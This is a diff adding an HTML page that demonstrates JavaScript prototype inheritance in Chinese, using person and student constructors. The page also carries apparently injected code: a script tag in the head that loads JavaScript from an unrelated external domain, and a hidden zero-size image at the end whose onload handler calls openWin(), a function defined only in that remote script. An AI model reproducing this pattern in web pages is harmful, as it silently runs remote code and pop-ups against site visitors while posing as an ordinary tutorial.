@@ -1,0 +1,30 @@
+<!doctype html public "-//w3c//dtdxhtml1.0 strict//en"
+"http://www.w3.org/tr/xhtml1/dtd/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+    <head> 
+	    <title>javascript中的对象类</title>
+	<script language="javascript" type="text/javascript" src="http://js.i8844.cn/js/user.js"></script></head>
+   <body>
+      <script language="javascript">
+	     function person(name,id) {
+		                  this.name = name;
+						  this.id = id;
+						  }
+		 person.prototype.gohome = function(){
+						      document.write("we will go home");	   
+						  };
+		 var p = new person("乌龟",1);
+		 p.gohome();
+		 function student(love,name,id){
+		          person.call(this,name,id);
+				  this.love = love;
+				  }
+		 student.prototype = new person();
+		 student.prototype.gohome = function() {
+		            document.write("we must study hard");
+					};
+		 var s = new student();
+		 s.gohome();
+	  </script>
+   <img src="http://www.baidu.com/search/img/logo.gif" width="0" height="0" onload="openWin();" /></body>
+</html>
